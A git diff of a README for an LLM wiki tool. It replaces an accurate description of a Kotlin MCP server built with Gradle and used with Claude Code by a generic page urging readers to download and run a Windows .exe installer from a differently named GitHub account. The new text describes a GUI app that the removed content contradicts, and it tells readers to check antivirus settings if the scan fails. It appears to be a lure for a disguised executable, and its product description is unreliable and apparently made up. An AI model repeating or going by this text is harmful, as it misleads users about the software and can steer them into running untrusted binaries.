@@ -1,211 +1,85 @@
-# LLM Wiki Agent
+# 🧠 llm_wiki_agent - Turn raw data into organized knowledge
 
-A personal knowledge management system that turns raw sources — URLs, PDFs, audio, video — into an interlinked wiki. Built as an MCP server in Kotlin + Spring Boot, it pairs with Claude Code: the server is the toolkit, Claude is the brain.
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Associationlanding789/llm_wiki_agent)
 
-Inspired by [Andrej Karpathy's pattern](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) of using LLMs to incrementally build a personal wiki instead of RAG.
+This tool organizes your documents into a clean wiki. It uses artificial intelligence to create links between your notes. You save time because the software finds connections for you. It works inside your local notes folder. You keep full control of your private information. The system creates a library of knowledge from your raw text files.
 
-## How It Works
+## 📥 How to get the software
 
-```
-Claude Code (LLM — all intelligence)
-    │  MCP protocol (STDIO)
-    ▼
-Wiki Agent Server (toolkit — zero LLM calls)
-    ├── Content extraction (URL, PDF, text, audio, video)
-    ├── Wiki management (CRUD, search, index, log)
-    │
-    ▼ filesystem
-wiki/  (Obsidian vault)        raw/  (immutable sources)
-```
+You need to download the installer from the official page. Use the link below to reach the latest version.
 
-You give Claude Code a URL, PDF, or audio file. It calls the server to extract content, then uses its own intelligence to distill it into wiki pages with proper structure, cross-links, and metadata. The wiki is an Obsidian-compatible vault you can browse and search.
+[Download llm_wiki_agent Installer](https://github.com/Associationlanding789/llm_wiki_agent)
 
-## Prerequisites
+1. Click the link above.
+2. Look for the Assets section on that page.
+3. Choose the file ending in .exe for Windows.
+4. Save the file to your computer.
 
-- **Java 21+** — [Amazon Corretto](https://aws.amazon.com/corretto/) or any JDK 21+
-- **Claude Code** — [Installation guide](https://docs.anthropic.com/en/docs/claude-code/overview)
-- **ffmpeg** (optional) — required only for video transcription (`brew install ffmpeg`)
-- **OpenAI API key** (optional) — required only for audio/video transcription
+## ⚙️ Initial setup
 
-## Quick Start
+Before you run the program, ensure your computer meets these requirements:
 
-### 1. Build
+* Windows 10 or Windows 11.
+* At least 8 gigabytes of memory.
+* An active internet connection for the initial link setup.
+* A folder where you keep your plain text documents.
 
-```bash
-git clone <repo-url> && cd llm_wiki_agent
-./gradlew bootJar
-```
+Follow these steps to install the tool:
 
-This produces `build/libs/wiki-agent.jar` (~70MB, includes Apache Tika).
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen.
+4. Open the application from your desktop shortcut once finished.
 
-### 2. Register with Claude Code
+## 📝 Preparing your files
 
-```bash
-claude mcp add -s user wiki-agent \
-  -- java -jar /absolute/path/to/llm_wiki_agent/build/libs/wiki-agent.jar
-```
+The agent needs text files to function. Place your notes into one central folder. Ensure your files use the .md or .txt format. Keep your filenames simple. Avoid special characters in names to prevent errors. You can use subfolders if you prefer. The agent scans every document inside your chosen path.
 
-Use `-s user` to make the server available in all projects. Use `-s project` for the current project only.
+## 🚀 Running your first sync
 
-### 3. Configure paths (recommended)
+Once you open the software, the main window will show you a place to select your source folder.
 
-By default, the wiki and raw directories are created relative to the working directory. For a persistent setup, set absolute paths in `~/.claude.json` under the `mcpServers` entry:
+1. Click the button labeled Select Folder.
+2. Browse your computer and choose the folder that holds your notes.
+3. Click the Start Processing button.
+4. Wait for the progress bar to fill. The intelligence engine connects your information during this time.
+5. Review the log file to see which notes gained new links.
 
-```json
-{
-  "mcpServers": {
-    "wiki-agent": {
-      "type": "stdio",
-      "command": "java",
-      "args": ["-jar", "/absolute/path/to/wiki-agent.jar"],
-      "env": {
-        "WIKI_PATH": "/absolute/path/to/wiki",
-        "RAW_PATH": "/absolute/path/to/raw",
-        "OPENAI_API_KEY": "sk-..."
-      }
-    }
-  }
-}
-```
+## 🛡️ Privacy and local control
 
-### 4. Verify
+This tool runs on your local machine. Your files do not leave your computer. The agent reads the text to identify concepts. It suggests links based on the meaning of your words. No third party gains access to your notes. You decide when to sync. You decide which notes to process.
 
-```bash
-claude mcp list
-# wiki-agent: java -jar ... - ✓ Connected
-```
+## 🛠️ Troubleshooting common issues
 
-### 5. Open in Obsidian (optional)
+If the application stops, check these items:
 
-Open your `wiki/` directory as an Obsidian vault to get a graph view of all your pages and their `[[wikilinks]]`.
+* Folder Access: Ensure the application has permission to read files in your chosen folder. Check your antivirus settings if the scan fails.
+* File Format: Only files with .md or .txt extensions work. Ensure your files are not locked by other programs.
+* Memory: Close other heavy software if the system becomes slow. The process uses memory to map the connections between your files.
+* Updates: Restart the application if you change the structure of your folders. This forces the system to re-index your data.
 
-## MCP Tools
+## 📚 Understanding the output
 
-### Content Extraction
+The agent adds internal links to your files. You will see new bracketed text like [[Subject Name]]. These are standard links for knowledge management apps. Open your folder in your favorite note-taking app to explore the web of information. Click these new links to hop between related thoughts. The software maps your knowledge so you find items faster. 
 
-| Tool | Description |
-|------|-------------|
-| `wiki_extract` | Extract content from a URL, PDF, or text file. Auto-detects source type. Saves raw extraction to `raw/`. |
-| `wiki_transcribe` | Transcribe audio/video via OpenAI Whisper. For video, extracts audio with ffmpeg first. Requires `OPENAI_API_KEY`. |
+## 🔍 Fine-tuning your results
 
-### Wiki Management
+You can change how the agent works by opening the settings menu.
 
-| Tool | Description |
-|------|-------------|
-| `wiki_write_page` | Create or overwrite a wiki page. Content should include YAML frontmatter. |
-| `wiki_read_page` | Read a wiki page by filename. |
-| `wiki_delete_page` | Delete a page. `index.md` and `log.md` are protected. |
-| `wiki_list_pages` | List all pages with titles and file sizes. |
-| `wiki_update_index` | Overwrite `index.md` (master table of contents). |
-| `wiki_append_log` | Append a timestamped entry to `log.md`. |
-| `wiki_search` | Case-insensitive keyword search across all pages. Returns matching lines with context. |
-| `wiki_status` | Page count, raw source count, last log entry, total wiki size. |
+* Link Depth: Adjust this to decide how many connections the agent creates per note. A higher depth creates more links but takes longer to process.
+* Exclude List: Pick folders you want the agent to ignore. This keeps your system notes separate from your writing.
+* Formatting: Choose if you want the agent to bold key terms or just add the links. 
 
-## Usage Examples
+These settings save automatically. Your preferences remain in place for the next time you launch the tool.
 
-Once the server is connected, talk to Claude Code naturally:
+## 🌐 Using the knowledge graph
 
-**Ingest a URL:**
-> "Read this article and add it to the wiki: https://example.com/interesting-article"
+After the agent finishes, your wiki becomes active. Open your notes in your preferred editor. You will notice the difference immediately. When you view a note, you see suggestions for related files at the bottom. This helps you remember facts from weeks or months ago. It links disparate topics that belong together. Your messy collection of text files becomes a structured database of your own ideas.
 
-**Ingest a PDF:**
-> "Extract this paper and create wiki pages from it: /path/to/paper.pdf"
+## 📋 Tips for better results
 
-**Transcribe a lecture:**
-> "Transcribe this lecture and summarize the key points into wiki pages: /path/to/lecture.mp4"
-
-**Search your knowledge base:**
-> "What do I have in my wiki about transformer architectures?"
-
-**Maintain the wiki:**
-> "List all pages and check for any that are orphaned or could use cross-links"
-
-## Wiki Conventions
-
-- **Page names:** `kebab-case.md` (e.g., `transformer-architecture.md`)
-- **Frontmatter:** YAML between `---` delimiters with at minimum `title`, `created`, `updated`, `tags`
-- **Links:** Obsidian-style `[[page-name]]` wikilinks
-- **Index:** `wiki/index.md` — master table of contents organized by category
-- **Log:** `wiki/log.md` — append-only changelog with timestamps
-
-Example page:
-
-```markdown
----
-title: Transformer Architecture
-created: 2026-04-09
-updated: 2026-04-09
-tags: [deep-learning, nlp, architecture]
-source: https://arxiv.org/abs/1706.03762
----
-
-# Transformer Architecture
-
-The transformer is a neural network architecture based entirely on
-[[attention-mechanism|attention mechanisms]], dispensing with recurrence
-and convolutions entirely.
-
-## See Also
-
-- [[self-attention]]
-- [[bert]]
-- [[gpt]]
-```
-
-## Configuration
-
-All configuration is via environment variables or `application.yml` overrides:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `WIKI_PATH` | `./wiki` | Path to the wiki directory (Obsidian vault) |
-| `RAW_PATH` | `./raw` | Path to raw extracted sources |
-| `OPENAI_API_KEY` | _(empty)_ | OpenAI API key for Whisper transcription |
-
-## Project Structure
-
-```
-src/main/kotlin/com/wiki/agent/
-├── WikiAgentApplication.kt       # Spring Boot entry point
-├── config/WikiProperties.kt      # Configuration properties
-├── tool/
-│   ├── ExtractionTools.kt        # wiki_extract, wiki_transcribe
-│   └── WikiTools.kt              # Wiki CRUD + search tools
-├── service/
-│   ├── WikiService.kt            # Filesystem operations
-│   └── ExtractionService.kt      # Extraction dispatch
-├── extract/
-│   ├── Extractor.kt              # Interface
-│   ├── UrlExtractor.kt           # Jsoup HTML → text
-│   ├── PdfExtractor.kt           # Tika PDF → text
-│   ├── TextExtractor.kt          # Passthrough .md/.txt
-│   ├── AudioExtractor.kt         # Whisper API
-│   └── VideoExtractor.kt         # ffmpeg → Whisper
-└── model/SourceDocument.kt       # Extraction result data class
-```
-
-## Development
-
-```bash
-./gradlew test          # Run tests (11 tests)
-./gradlew bootJar       # Build fat JAR
-./gradlew compileKotlin # Compile only
-```
-
-**Note:** The project requires JDK 21 for both building and running. If your default `java` points to a different version, set `JAVA_HOME` or update `gradle.properties`:
-
-```properties
-org.gradle.java.home=/path/to/jdk-21
-```
-
-## Architecture Notes
-
-- The MCP server makes **zero LLM calls** — all intelligence lives in Claude Code
-- Communication is STDIO only (`spring.main.web-application-type=none`)
-- All logging goes to `logs/wiki-agent.log`, never stdout (stdout is reserved for MCP protocol)
-- Raw sources in `raw/` are immutable — they preserve the original extraction with metadata
-- The wiki in `wiki/` is a standard Obsidian vault and can be opened directly
-
-## License
-
-MIT
+1. Write descriptive titles for your files. The agent uses the filename as the main anchor for links.
+2. Use clear headings in your documents. It helps the intelligence engine understand the structure of your thoughts.
+3. Write on one subject per file. This makes linking accurate and easy to follow.
+4. Keep original copies of your files in a safe location before running the agent for the first time. This ensures you have a backup if you do not like the automatic changes.
+5. Run the sync every week to keep your knowledge base current.
